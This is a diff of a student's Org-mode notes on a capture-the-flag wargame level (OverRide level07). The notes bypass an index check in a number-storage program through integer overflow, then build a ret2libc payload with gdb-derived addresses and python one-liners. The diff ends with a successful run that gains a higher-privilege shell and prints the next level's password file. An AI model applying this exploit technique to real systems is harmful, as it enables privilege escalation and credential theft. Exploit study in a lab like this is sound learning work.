@@ -393,6 +393,7 @@ find &system,+9999999,"/bin/sh"
   p 0x1B8-0x10
   $20 = 424
   424 / 4 = 106
+  or what number * 4 = 424
 
 #+end_src
 *** store number
@@ -444,9 +445,10 @@ Look like just don't leave write in index  % 3 == 0
 #+end_quote
 **** Canary write.
 #+begin_src shell
- set $a=106
-(gdb) p $a == 3 * ($a/3)
-$28 = 0
+   set $a=106
+  (gdb) p $a == 3 * ($a/3)
+  $28 = 0
+  #for bypass could use the * 4 it use to reach the index of int
 #+end_src
 **** Return main write
 #+begin_src shell
@@ -460,9 +462,109 @@ $28 = 0
   $37 = 114
 
 
-    set $a=114
-    (gdb) p $a == 3 * ($a/3)
-    $30 = 1 // For what i see doesn't gonna change the index
+  set $a=114
+  (gdb) p $a == 3 * ($a/3)
+  $30 = 1 // For what i see doesn't gonna change the index
+                            @hakamed thx for ur advice i use that in a previos level but don't got the idea in this  level.
+
+
+  p (int) 2147483648
+  $4 = -2147483648
+  (gdb) p (int) 2147483648 <<2
+  $5 = 0
+  (gdb) p (int) 2147483648 * 2
+  $6 = 0
+                            (gdb) p (int) 2147483648 + 114  
+  $7 = -2147483534
+                            (gdb) p (int) (2147483648 + 114) * 4
+                            $9 = 456
+                            (gdb) p (int) (2147483648 + 114)
+                            $10 = -2147483534
+                            (gdb) p (int) (2147483648 + 114) * 4
+                            $11 = 456
+                              set $a=-2147483534
+                              (gdb) p $a == 3 * ($a/3)
+                              $12 = 0
+                            This way should puth system, exit and /bin/sh
+
+                       system=0xf7e6aed0
+                       exit=0xf7e5eb70
+                       "/bin/sh"_va=0xf7f897ec:	 
+
+                           index_ret_main=-2147483534
+                           system=0xf7e6aed0
+                           ret_system_va=0xf7e5eb70
+                           ret_system_va= 114 + 1 -> 115
+                     set $a=115
+                     (gdb) p $a == 3 * ($a/3)
+                     $5 = 0
+                           "/bin/sh"_va=0xf7f897ec:	 
+                           index_system_param= 114 + 2 -> 116
+
+                         set $a=116
+                         (gdb) p $a == 3 * ($a/3)
+                         $14 = 0
+                         then payload for this way is
+                       payload_write_system_va="store\x00-2147483534\n"+"\xf7\xe6\xae\xd0"[::-1]
+                  payload_write_exit_va="store\x00115\n"+"\xf7\xe5\xeb\x70"[::-1]
+                  payload_write_param_va="store\x00116\n"+"\xf7\xf8\x97\xec"[::-1]
+                  payload_launch="quit\x00"
+                full_payload=[write_system_va]+[write_exit_va]+[write_param_va]+[launch]
+                full_payload="store\x00-2147483534\n"+"\xf7\xe6\xae\xd0"[::-1]+"store\x00115\n"+"\xf7\xe5\xeb\x70"[::-1]+"store\x00116\n"+"\xf7\xf8\x97\xec"[::-1]+"quit\x00"
+
+                python -c 'print "store\x00-2147483534\n"+"\xf7\xe6\xae\xd0"[::-1]+"store\x00115\n"+"\xf7\xe5\xeb\x70"[::-1]+"store\x00116\n"+"\xf7\xf8\x97\xec"[::-1]+"quit\x00"
+               '
+
+               # If i do i little check i got bad the order and need a little fix
+               (python -c 'print "store"; print "\xf7\xe6\xae\xd0"[::-1]; print "-2147483534";print "quit"') | ./$USER
+             # Fixed payload
+           payload_write_system_va=print "store"; print "\xf7\xe6\xae\xd0"[::-1]; print "-2147483534"
+           payload_write_exit_va= print "store"; print "\xf7\xe5\xeb\x70"[::-1]; print "115"
+           payload_write_param_va=print "store"; print  "\xf7\xf8\x97\xec"[::-1]; print "116"
+           payload_launch=print "quit"
+
+           full_payload='print "store"; print "-2147483534"; print "\xf7\xe6\xae\xd0"[::-1]; print "store"; print "115"; print "\xf7\xe5\xeb\x70"[::-1];print "store"; print "116"; print  "\xf7\xf8\x97\xec"[::-1];print "quit"'
+
+           python -c 'print "store"; print "\xf7\xe6\xae\xd0"[::-1]; print "-2147483534"; print "store";  print "\xf7\xe5\xeb\x70"[::-1]; print "115";print "store"; print  "\xf7\xf8\x97\xec"[::-1]; print "116";print "quit"'
+
+           # Fix v2
+          need to put the nbr not the pointer.
+         p system
+        $5 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+        (gdb) p/d 0xf7e6aed0
+        $6 = 4159090384
+        p/d 0xf7e6aed0 /bin/sh
+        $7 = 4159090384
+
+          system_va=4159090384
+          system_ret_va=4159040368(exit_va)
+          system_param_va=4159090384
+          
+           python -c 'print "store"; print "4159090384"; print "-2147483534"; print "store";  print "4159040368"; print "115";print "store"; print  "4159090384"; print "116";print "quit"'
+      #first storage change the ret main.
+        x/a 0xffffdc3c
+      0xffffdc3c:	0xf7e6aed0
+      (gdb) info symbol 0xf7e6aed0
+
+      system in section .text of /lib32/libc.so.6
+      (gdb) system in section .text of /lib32/libc.so.6
+      #second storage change 2
+      x/a 0xffffdc3c+4
+      0xffffdc40:	0xf7e5eb70
+      (gdb)  info symbol 0xf7e5eb70
+      exit in section .text of /lib32/libc.so.6
+
+    # Fix 3 i put exit as /bin/sh  va
+  system=0xf7e6aed0
+  exit=0xf7e5eb70
+  system_va=4159090384
+  "/bin/sh"_va=0xf7f897ec:	 
+  system_ret_va=4159040368(exit_va)
+  system_param_va||"/bin/sh"_va=4160264172
+  index_ret_main=-2147483534
+  index_system_va= 114 + 1 -> 115
+  index_system_param= 114 + 2 -> 116
+
 #+end_src
 ***** Look further asm
 ****** Canary preserved
@@ -481,11 +583,7 @@ $28 = 0
 #+end_src
 
 #+begin_quote
-Modify ebp-0xc to point esp to another place where esp+4*5 = ret va
-#+end_quote
-
-#+begin_quote
-For what i see i can't exploit or i don't know how.
+ For what i see i can't exploit or i don't know how. Fix thk to the peer  @hakamed
 #+end_quote
 ****** Canary not preserved
 #+begin_src shell
@@ -565,7 +663,7 @@ Need to pass /bin/sh to parameter to system
 CLOSED: [2025-12-12 Fri 07:15]
 :LOGBOOK:
 - State "CANC"       from              [2025-12-12 Fri 07:15] \\
-  doesn't leave to write there.
+i could by pass with @hakamed solution.
 :END:
 #+begin_src shell
         esp + 8 param - 0x24 (arr_int)
@@ -719,5 +817,45 @@ CLOSED: [2025-12-11 Thu 15:10]
 
 * Explotation
 #+begin_src shell
-cat /tmp/$USER - | ./$USER
+      # index modify return main
+  ( python -c 'print "store"; print "4159090384"; print "-2147483534"; print "store";  print "4159040368"; print "115"; print "store"; print  "4160264172"; print "116";print "quit"';cat -) | ./$USER
+  ----------------------------------------------------
+    Welcome to wil's crappy number storage service!   
+  ----------------------------------------------------
+   Commands:                                          
+      store - store a number into the data storage    
+      read  - read a number from the data storage     
+      quit  - exit the program                        
+  ----------------------------------------------------
+     wil has reserved some storage :>                 
+  ----------------------------------------------------
+
+  Input command:  Number:  Index:  Completed store command successfully
+  Input command:  Number:  Index:  Completed store command successfully
+  Input command:  Number:  Index:  Completed store command successfully
+  id
+  uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
+  cat /home/users/`whoami`/.pass
+  7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+  Input command: level07@OverRide:~$ 
+# or with the file.
+      cat /tmp/$USER - | ./$USER
+    ----------------------------------------------------
+      Welcome to wil's crappy number storage service!   
+    ----------------------------------------------------
+     Commands:                                          
+        store - store a number into the data storage    
+        read  - read a number from the data storage     
+        quit  - exit the program                        
+    ----------------------------------------------------
+       wil has reserved some storage :>                 
+    ----------------------------------------------------
+
+    Input command:  Number:  Index:  Completed store command successfully
+    Input command:  Number:  Index:  Completed store command successfully
+    Input command:  Number:  Index:  Completed store command successfully
+    id
+    uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
+    cat /home/users/`whoami`/.pass
+    7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 #+end_src
